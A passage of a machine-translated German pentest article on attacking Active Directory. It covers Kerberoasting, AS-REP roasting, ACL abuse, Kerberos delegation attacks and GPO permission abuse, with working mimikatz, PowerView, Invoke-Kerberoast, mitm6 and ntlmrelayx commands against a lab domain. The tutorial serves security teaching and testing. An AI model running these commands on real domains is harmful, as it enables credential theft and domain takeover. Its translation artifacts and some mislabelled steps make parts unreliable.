<br><br>  4. Das TGS-Ticket wird mit dem NTLM-Hash des Dienstkontokennworts verschl√ºsselt und an den Benutzer gesendet (TGS-REP). <br><br>  5. Der Benutzer stellt dem Computer, auf dem der Dienst ausgef√ºhrt wird, ein TGS-Ticket zur Verf√ºgung (AP-REQ).  Der Dienst √∂ffnet ein TGS-Ticket mit seinem NTLM-Hash. <br><br>  6. Der Zugriff auf den Dienst wird bereitgestellt (AS-REP). <br><br>  Nachdem wir ein TGS-Ticket (TGS-REP) erhalten haben, k√∂nnen wir das Passwort f√ºr das Dienstkonto offline finden.  Zum Beispiel mit Hashcat. <br><br>  Gem√§√ü <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">RFC396</a> sind 20 Verschl√ºsselungstypen f√ºr das Kerberos-Protokoll reserviert.  Die derzeit verwendeten Verschl√ºsselungsarten in der Reihenfolge ihrer Priorit√§t: <br><br><ul><li>  AES256_CTS_HMAC_SHA1 </li><li>  AES128_CTS_HMAC_SHA1 </li><li>  RC4_HMAC_MD5 </li></ul><br>  In neueren Windows-Versionen wird standardm√§√üig die AES-Verschl√ºsselung verwendet.  F√ºr die Kompatibilit√§t mit Systemen unter Windows Vista und Windows 2008 Server ist jedoch die Unterst√ºtzung des RC4-Algorithmus erforderlich.  Bei einem Angriff wird immer zuerst versucht, ein TGS-Ticket mit RC4_HMAC_MD5-Verschl√ºsselung zu erhalten, das schnellere Passw√∂rter und dann den Rest erm√∂glicht.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Harmj0y</a> f√ºhrte eine interessante <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Studie durch</a> und stellte fest, dass das Kerberos-Ticket weiterhin mit RC4_HMAC_MD5-Verschl√ºsselung ausgestellt wird, wenn Sie in den Benutzereigenschaften nur die Verschl√ºsselungsunterst√ºtzung f√ºr Kerberos AES128 und AES256 angeben. <br><br><img src="https://habrastorage.org/webt/el/4w/vn/el4wvniixybekufn7jswfcr7pey.png"><br><br>  Das Deaktivieren von RC4_HMAC_MD5 ist auf Dom√§nenebene erforderlich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">.</a> <br><br>  Kerberoasting-Angriff hat zwei Ans√§tze. <br><br>  1. Die alte Methode.  TGS-Tickets werden √ºber setspn.exe oder das .NET System.IdentityModel.Tokens.KerberosRequestorSecurityToken der Powershell-Klasse angefordert, mit mimikatz aus dem Speicher abgerufen, dann in das gew√ºnschte Format (John, Hashcat) konvertiert und sortiert. <br><br>  2. Die neue Methode.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">machosec</a> bemerkte, dass die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">KerberosRequestorSecurityToken-</a> Klasse √ºber eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GetRequest-</a> Methode verf√ºgt, die den verschl√ºsselten Teil mit einem Kennwort aus einem TGS-Ticket extrahiert. <br><br>  Werkzeuge zur Durchf√ºhrung eines Angriffs: <br><br>  1) Suchen Sie nach SPN-Datens√§tzen <br><br><ul><li>  <a href="">GetUserSPN.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Find-PSServiceAccounts.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Get-NetUSER -SPN</a> </li><li>  (Get-ADUser -Filter {ServicePrincipalName -ne "$ null"} -Properties ServicePrincipalName) .ServicePrincipalName </li></ul><br>  2) Fordern Sie ein TGS-Ticket an <br><br><ul><li>  setspn.exe (natives Windows-Dienstprogramm) </li><li>  Ticketanfrage √ºber Powershell <br><br><pre> <code class="plaintext hljs">Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ‚Äú&lt;ServicePrincipalName&gt;‚Äù</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Request-SPNTicket</a> </li></ul><br>  Sie k√∂nnen die aktuell zwischengespeicherten Tickets mit dem Befehl klist anzeigen. <br><br><div class="spoiler">  <b class="spoiler_title">Gemeinsame SPN-Datens√§tze</b> <div class="spoiler_text"><ul><li>  TERMSRV - Remotedesktop </li><li>  SmtpSVC und SMTP - Mail </li><li>  WSMAN - WinRM </li><li>  ExchangeAB, ExchangeRFR, ExchangeMDM - MS Exchange </li><li>  POP / POP3 - POP3 Postdienst </li><li>  IMAP / IMAP4 - IMAP-E-Mail-Dienst </li><li>  MSSQLSvc - Microsoft SQL Server </li><li>  MONGO - MongoDB-Datenbankserver </li><li>  DNS - DNS-Server </li><li>  HTTP, WWW - Webserver </li><li>  LDAP - LDAP </li><li>  FTP - FTP-Server </li></ul><br></div></div><br>  3) Export von Tickets: <br><br><ul><li>  <a href="">Invoke-Mimikatz</a> -Befehl '"Kerberos :: list / export"' </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Mimikatz</a> -Befehl '"Kerberos :: list / export"' </li><li>  <a href="">Invioke-Kerberoast</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">tgsrepack.py</a> </li></ul><br><br>  Ein Beispiel f√ºr die automatisierte Ausf√ºhrung aller 3 Punkte: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">RiskiskSPN</a> <br><br><pre> <code class="bash hljs">Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format <span class="hljs-string"><span class="hljs-string">"Hashcat"</span></span> | Out-File kerberoasting.txt</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Powersploit</a> <br><br><pre> <code class="bash hljs">Invoke-Kerberoast -Domain jet.lab -OutputFormat Hashcat | fl</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GetUserSPNs.py</a> <br><br><pre> <code class="bash hljs">GetUserSPNs.py -request jet.lab\user:Password</code> </pre> </li></ul><br><h3>  Asreproast </h3><br>  Die Sicherheitsanf√§lligkeit besteht darin, dass die Kerberos-Vorauthentifizierung deaktiviert ist.  In diesem Fall k√∂nnen wir AS-REQ-Anforderungen an einen Benutzer senden, bei dem die Kerberos-Vorauthentifizierung deaktiviert ist, und den verschl√ºsselten Teil mit einem Kennwort abrufen. <br><br><img src="https://habrastorage.org/webt/zd/pm/h5/zdpmh5i7cas-s0gtv2uopy2sj14.png"><br><br>  Die Sicherheitsanf√§lligkeit ist selten, da das Deaktivieren der Vorauthentifizierung nicht die Standardeinstellung ist. <br><br>  Suchen nach Benutzern mit deaktivierter Kerberos-Authentifizierung: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Powerview</a> <br><br><pre> <code class="bash hljs">Get-DomainUser -PreauthNotRequired -Properties samaccountname -Verbose</code> </pre> </li><li>  Active Directory-Modul <br><br><pre> <code class="bash hljs">get-aduser -filter * -properties DoesNotRequirePreAuth | <span class="hljs-built_in"><span class="hljs-built_in">where</span></span> {<span class="hljs-variable"><span class="hljs-variable">$_</span></span>.DoesNotRequirePreAuth -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span> -and <span class="hljs-variable"><span class="hljs-variable">$_</span></span>.Enabled -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span>} | select Name</code> </pre> </li></ul><br>  Erhalten des verschl√ºsselten Teils: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ASREPRoast</a> <br><br><pre> <code class="bash hljs">Invoke-ASREPROast | fl</code> </pre> <br><img src="https://habrastorage.org/webt/i_/o-/vf/i_o-vfbviphgjknolenx_qoesyo.png"></li></ul><br><br><h1>  Angriff √ºber ACL </h1><br>  Eine ACL in einem Dom√§nenkontext besteht aus einer Reihe von Regeln, die die Zugriffsrechte von Objekten in AD definieren.  Eine ACL kann f√ºr ein einzelnes Objekt (z. B. ein Benutzerkonto) oder f√ºr eine Organisationseinheit, z. B. OU, konfiguriert werden.  Wenn Sie die ACL in der Organisationseinheit konfigurieren, erben alle Objekte in der Organisationseinheit die ACL.  Die ACLs enthalten Zugriffssteuerungseintr√§ge (ACEs), die bestimmen, wie die SID mit dem Active Directory-Objekt interagiert. <br><br>  Zum Beispiel haben wir drei Gruppen: A, B, C, wobei Gruppe C ein Mitglied der Gruppe B und Gruppe B ein Mitglied der Gruppe A ist. Wenn Sie Gast zu Gruppe C hinzuf√ºgen, ist Gast nicht nur Mitglied der Gruppe C, sondern auch ein indirektes Mitglied der Gruppen B und A. Wenn Sie der Gruppe A Zugriff auf ein Dom√§nenobjekt hinzuf√ºgen, hat der Gastbenutzer auch Zugriff auf dieses Objekt.  In einer Situation, in der der Benutzer ein direktes Mitglied nur einer Gruppe ist und diese Gruppe ein indirektes Mitglied der anderen 50 Gruppen ist, kann die Verbindung geerbter Berechtigungen leicht verloren gehen. <br><br>  Sie k√∂nnen die dem Objekt zugeordneten ACLs abrufen, indem Sie den folgenden Befehl ausf√ºhren <br><br><pre> <code class="bash hljs">Get-ObjectACL -Samaccountname Guest -ResolveGUIDs</code> </pre> <br>  Mit dem Tool k√∂nnen Sie Fehler in der ACL-Konfiguration ausnutzen. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Invoke-ACLPwn</a> .  Das Powershell-Skript sammelt mithilfe des BloodHound-Kollektors SharpHound Informationen zu allen ACLs in der Dom√§ne und erstellt eine Kette, um die writeDACL-Berechtigung zu erhalten.  Nachdem die Kette erstellt wurde, f√ºhrt das Skript jeden Schritt der Kette aus.  Die Reihenfolge des Skripts: <br><br><ol><li>  Der Benutzer wird zu den erforderlichen Gruppen hinzugef√ºgt. </li><li>  Den ACLs des Dom√§nenobjekts werden zwei ACEs (Replizieren von Verzeichnis√§nderungen und Replizieren von Verzeichnis√§nderungen ALL) hinzugef√ºgt. </li><li>  Wenn Sie mit dem Dienstprogramm Mimikatz Rechte an DCSync haben, wird der Kennwort-Hash des Benutzers krbtgt angefordert (Standardeinstellung). </li><li>  Nach Abschluss des Vorgangs l√∂scht das Skript alle hinzugef√ºgten Gruppen und ACE-Eintr√§ge in der ACL. </li></ol><br>  Das Skript ist nur f√ºr die Verwendung von writeDACL-Berechtigungen vorgesehen.  Die folgenden Zugriffsrechte k√∂nnen f√ºr einen Angreifer ebenfalls von Interesse sein: <br><br><ul><li>  ForceChangePassword.  Rechte zum √Ñndern des Benutzerkennworts, wenn das aktuelle Kennwort nicht bekannt ist.  Betrieb mit PowerSploit - Set-DomainUserPassword. </li><li>  AddMembers.  Rechte zum Hinzuf√ºgen von Gruppen, Computern und Benutzern zu Gruppen.  Betrieb mit PowerSploit - Add-DomainGroupMember. </li><li>  GenericWrite  Rechte zum √Ñndern der Attribute eines Objekts.  √Ñndern Sie beispielsweise den Wert des Parameters scriptPath.  Wenn sich der Benutzer das n√§chste Mal am System anmeldet, wird die angegebene Datei gestartet.  Betrieb mit PowerSploit - Set-DomainObject. </li><li>  WriteOwner.  Rechte zum √Ñndern des Eigent√ºmers des Objekts.  Betrieb mit PowerSploit - Set-DomainObjectOwner. </li><li>  AllExtendedRights.  Rechte zum Hinzuf√ºgen von Benutzern zu Gruppen, √Ñndern von Benutzerkennw√∂rtern usw. Betrieb mit PowerSploit - Set-DomainUserPassword oder Add-DomainGroupMember. </li></ul><br>  Bedienung: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Invoke-aclpwn</a> </li></ul><br>  Ausgehend von einem Computer, der sich in einer Dom√§ne befindet <br><br><pre> <code class="bash hljs">./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe</code> </pre> <br>  Ausgehend von einem Computer, der sich nicht in einer Dom√§ne befindet <br><br><pre> <code class="bash hljs">/Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <span class="hljs-string"><span class="hljs-string">'domain\user'</span></span> -Domain <span class="hljs-string"><span class="hljs-string">'fqdn_of_target_domain'</span></span> -Password <span class="hljs-string"><span class="hljs-string">'Pass'</span></span></code> </pre> <br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">aclpwn.py</a> ist ein √§hnliches Tool, das in Python geschrieben wurde </li></ul><br><h3>  Kerberos-Delegation </h3><br>  Mit der Kerberos-Berechtigungsdelegation k√∂nnen Sie Endbenutzeranmeldeinformationen wiederverwenden, um auf Ressourcen zuzugreifen, die auf einem anderen Server gehostet werden. <br><br>  Es gibt drei Arten der Kerberos-Delegierung: <br><br><ol><li>  Unbegrenzt (uneingeschr√§nkte Delegation).  Die einzige Delegierungsoption vor Windows Server 2003 </li><li>  Eingeschr√§nkte Delegierung seit Windows Server 2003 </li><li>  Ressourcenbasierte eingeschr√§nkte Delegierung  Eingef√ºhrt in Windows Server 2012 </li></ol><br><h4>  Unbegrenzte Delegation </h4><br>  Im Active Directory-Snap-In ist die unbegrenzte Delegierungsfunktion wie folgt aktiviert: <br><br><img src="https://habrastorage.org/webt/ip/mp/e8/ipmpe8ygslgtbdklbkiseqtwg64.png"><br><br>  √úberlegen Sie aus Gr√ºnden der √úbersichtlichkeit, wie eine unbegrenzte Delegierung in einem Diagramm erfolgt. <br><br><img src="https://habrastorage.org/webt/1i/p1/wq/1ip1wqkjnc9plqcqzmpkr1rcfwg.png"><br><br><ol><li>  Das Benutzerkennwort wird in ntlm-Hash konvertiert.  Der Zeitstempel wird mit diesem Hash verschl√ºsselt und an den Dom√§nencontroller gesendet, um ein TGT-Ticket anzufordern. </li><li>  Der Dom√§nencontroller √ºberpr√ºft die Informationen √ºber den Benutzer (Einschr√§nkung der Anmeldung, Mitgliedschaft in Gruppen usw.), erstellt ein TGT-Ticket und sendet es an den Benutzer.  Das TGT-Ticket ist verschl√ºsselt, signiert und nur krbtgt kann seine Daten lesen. </li><li>  Der Benutzer fordert ein TGS-Ticket an, um auf den Webservice auf dem Webserver zuzugreifen. </li><li>  Der Dom√§nencontroller stellt ein TGS-Ticket bereit. </li><li>  Der Benutzer sendet TGT- und TGS-Tickets an den Webserver. </li><li>  Das Webserver-Dienstkonto verwendet das TGT-Ticket des Benutzers, um ein TGS-Ticket f√ºr den Zugriff auf den Datenbankserver anzufordern. </li><li>  Das Dienstkonto stellt als Benutzer eine Verbindung zum Datenbankserver her. </li></ol><br>  Die Hauptgefahr einer unbegrenzten Delegierung besteht darin, dass ein Angreifer bei einer Gef√§hrdung eines Computers mit unbegrenzter Delegierung TGT-Tickets von Benutzern von diesem Computer abrufen und im Namen dieser Benutzer auf jedes System in der Dom√§ne zugreifen kann. <br><br>  Suchen Sie nach Computern in einer Dom√§ne mit unbegrenzter Delegierung: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Powerview</a> <br><br><pre> <code class="bash hljs">Get-NetComputer -unconstrained</code> </pre> </li><li>  Active Directory-Modul <br><br><pre> <code class="bash hljs">Get-Adcomputer -Filter {TrustedForDelegation -eq <span class="hljs-variable"><span class="hljs-variable">$True</span></span>}</code> </pre>  . </li></ul><br>  Ticket Export: <br><br><ul><li>  Mit Mimikatz.  sekurlsa :: tickets / export </li><li>  Sie k√∂nnen auch einen Pass-The-Ticket-Angriff durchf√ºhren. <br><br><pre> <code class="bash hljs"> kerberos::ptt C:\tickets\.</code> </pre> </li></ul><br><img src="https://habrastorage.org/webt/oa/wa/25/oawa25sduaj5u303b1q9svirdku.gif"><br><br><h4>  Begrenzte Delegation </h4><br>  Mit dem Modus der eingeschr√§nkten Delegierung k√∂nnen Sie nur auf zul√§ssige Dienste und auf einem bestimmten Computer zugreifen.  Im Active Directory-Snap-In sieht es folgenderma√üen aus: <br><br><img src="https://habrastorage.org/webt/xj/ku/no/xjkunogyspfpevoanui8nzxwlzq.png"><br><br>  Bei begrenzter Delegierung werden 2 Kerberos-Protokollerweiterungen verwendet: <br><br><ul><li>  S4uself </li><li>  S4UProxy </li></ul><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">S4U2Self wird</a> verwendet, wenn sich der Client nicht mit dem Kerberos-Protokoll authentifiziert. <br><br>  F√ºr eine unbegrenzte Delegierung wird TGT verwendet, um den Benutzer zu identifizieren. In diesem Fall verwendet die S4U-Erweiterung die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PA-FOR-USER-</a> Struktur als neuen Typ im Datenfeld padata / pre-authentication.  Der S4U2self-Prozess ist nur zul√§ssig, wenn f√ºr den anfordernden Benutzer das Feld TRUSTED_TO_AUTH_FOR_DELEGATION in seinem userAccountControl festgelegt ist. <br><br><img src="https://habrastorage.org/webt/oo/yk/5s/ooyk5sjtsusxcfkois5ej7dgnua.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Mit S4U2Proxy</a> kann das Dienstkonto das im S4U2proxy-Prozess empfangene Weiterleitungsticket verwenden, um ein TGS-Ticket f√ºr den Zugriff auf zul√§ssige Dienste anzufordern (msds-allowtodelegateto).  KDC pr√ºft, ob der angeforderte Dienst im Feld msds-allowtodelegateto des anfordernden Benutzers angegeben ist, und stellt ein Ticket aus, wenn die Pr√ºfung erfolgreich ist.  Daher ist die Delegierung auf bestimmte Zieldienste ‚Äûbeschr√§nkt‚Äú. <br><br><img src="https://habrastorage.org/webt/t-/a7/n6/t-a7n6ludbpsvmbk0ru_kwxvpq4.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mit </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> k√∂nnen Sie in einer begrenzten Delegierungsdom√§ne nach Computern und Benutzern </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">suchen</font></a><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Suchen Sie nach Computern mit unbegrenzter Delegierung</font></font><br><br><pre> <code class="bash hljs">Get-DomainComputer -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Suchen Sie nach Benutzern mit eingeschr√§nkter Delegierung </font></font><br><br><pre> <code class="bash hljs">Get-DomainUser -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Um einen Angriff durchzuf√ºhren, ben√∂tigen wir ein offenes Passwort, einen NTLM-Passwort-Hash oder ein TGT-Ticket. </font></font><br><br><img src="https://habrastorage.org/webt/gd/5f/fx/gd5ffxfwmgeqr5j28ovwzcqqacy.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ressourcenbasierte begrenzte Delegation </font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie bei der regul√§ren Delegierung werden S4U-Erweiterungen verwendet. Da es sich bei der ressourcenbasierten Delegierung in erster Linie um eine begrenzte Delegierung handelt, sind hier auch Angriffe verf√ºgbar, die f√ºr eine regul√§re eingeschr√§nkte Delegierung relevant sind. Der einzige Unterschied besteht darin, dass in einer einfachen eingeschr√§nkten Delegierung Dienst A das </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Attribut msDS-AllowedToDelegateTo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = ServiceB und Dienst B das </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Attribut msDS-AllowedToActOnBehalfOfOtherIdentity</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = Dienst A </font><font style="vertical-align: inherit;">haben sollte </font><font style="vertical-align: inherit;">. </font></font><br><br><img src="https://habrastorage.org/webt/td/um/jl/tdumjlcportki98xbixgfo1jaiu.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Diese Eigenschaft erm√∂glicht einen weiteren </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Angriff,</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> der von </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">harmj0y</font></a><font style="vertical-align: inherit;"> ver√∂ffentlicht wird</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">F√ºr einen Angriff sind Berechtigungen erforderlich, um den Parameter PrincipalsAllowedToDelegateToAccount zu √§ndern, mit dem das Attribut msds-AllowedToActOnBehalfOfOtherIdentity festgelegt wird, das eine Zugriffssteuerungsliste (ACL) enth√§lt. </font><font style="vertical-align: inherit;">Im Gegensatz zur eingeschr√§nkten Delegierung ben√∂tigen wir keine Dom√§nenadministratorrechte, um das Attribut msds-AllowedToActOnBehalfOfOtherIdentity zu √§ndern. </font><font style="vertical-align: inherit;">Sie k√∂nnen wie folgt herausfinden, wer zum Bearbeiten des Attributs berechtigt ist:</font></font><br><br><pre> <code class="plaintext hljs">(Get-acl "AD:$((get-adcomputer Windows7).distinguishedname)").access | Where-Object -Property ActiveDirectoryRights -Match WriteProperty |out-gridview</code> </pre> <br><img src="https://habrastorage.org/webt/ej/4p/bk/ej4pbkl5bkv5y75mqp54mxu0qcm.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Um den Angriff auszuf√ºhren, f√ºhren Sie mitm6 aus </font></font><br><br><pre> <code class="bash hljs">mitm6 -I vmnet0</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Wir starten ntlmrelayx mit der Option --delegate-access </font></font><br><br><pre> <code class="plaintext hljs">ntlmrelayx -t ldaps://dc1.jet.lab --delegate-access</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Als Ergebnis des Angriffs wird ein ZGXTPVYX $ -Computer mit Delegierungsrechten an den Windows7-Computer erstellt. </font></font><br><br><pre> <code class="plaintext hljs">$x = Get-ADComputer Windows7 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity $x.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access</code> </pre><br><img src="https://habrastorage.org/webt/21/oo/w9/21oow9kxnu53sg9wi-xnneus9fc.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ein guter Bericht √ºber die Delegation wurde </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pr√§sentiert</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> auf PHDays Egor Podmokovym.</font></font><br><br><img src="https://habrastorage.org/webt/kr/ri/za/krrizaffbrqgiee3gd2kufqs8s4.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Missbrauch von Gruppenrichtlinienobjektberechtigungen </font></font></h4><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gruppenrichtlinienobjekte</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ist ein Tool, mit dem Administratoren eine Dom√§ne effizient verwalten k√∂nnen. </font><font style="vertical-align: inherit;">Es kommt jedoch vor, dass Benutzern unn√∂tige Rechte zugewiesen werden, einschlie√ülich zum √Ñndern von Gruppenrichtlinienobjektrichtlinien. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Um das Beispiel zu demonstrieren, f√ºgen wir dem Ragnar-Benutzer die Rechte zum Bearbeiten der Standardrichtlinie f√ºr Dom√§nencontroller hinzu (im wirklichen Leben werden die Rechte f√ºr diese Richtlinie nur Dom√§nenadministratoren gew√§hrt, aber das Wesentliche des Angriffs √§ndert sich nicht; im Fall einer anderen Richtlinie √§ndern sich nur die kontrollierten Hosts). </font></font><br><br><img src="https://habrastorage.org/webt/yw/on/ht/ywonhtpbkwdqffjvzck5hdhjgza.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Z√§hlen Sie die Rechte f√ºr alle Gruppenrichtlinienobjekte in der Dom√§ne mithilfe von </font></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView auf</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br><br><pre> <code class="plaintext hljs">Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.Name}</code> </pre> <br><img src="https://habrastorage.org/webt/fk/cf/sk/fkcfskfmeohuicn13_76t190miy.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ein Ragnar-Benutzer hat das Recht, ein Gruppenrichtlinienobjekt mit einer GUID von 6AC1786C-016F-11D2-945F-00C04FB984F9 zu √§ndern. </font><font style="vertical-align: inherit;">F√ºhren Sie den folgenden Befehl aus, um festzustellen, welche Hosts in der Dom√§ne diese Richtlinie anwenden</font></font><br><br><pre> <code class="plaintext hljs">Get-NetOU -GUID "6AC1786C-016F-11D2-945F-00C04FB984F9" | % {Get-NetComputer -AdSpath $_}</code> </pre> <br><img src="https://habrastorage.org/webt/ou/ut/9c/ouut9cizgebvp9q_dkoifqlqgic.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Habe den Host dc1.jet.lab. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wenn wir die spezifische Richtlinie kennen, die der Ragnar-Benutzer bearbeiten kann, und die Hosts, f√ºr die diese Richtlinie gilt, k√∂nnen wir verschiedene Aktionen auf dem Host dc1.jet.lab ausf√ºhren.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nachfolgend finden Sie die Optionen f√ºr die Verwendung des Gruppenrichtlinienobjekts</font></font></b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Computerkonfiguration \ Einstellungen \ Einstellungen der Systemsteuerung \ Ordneroptionen 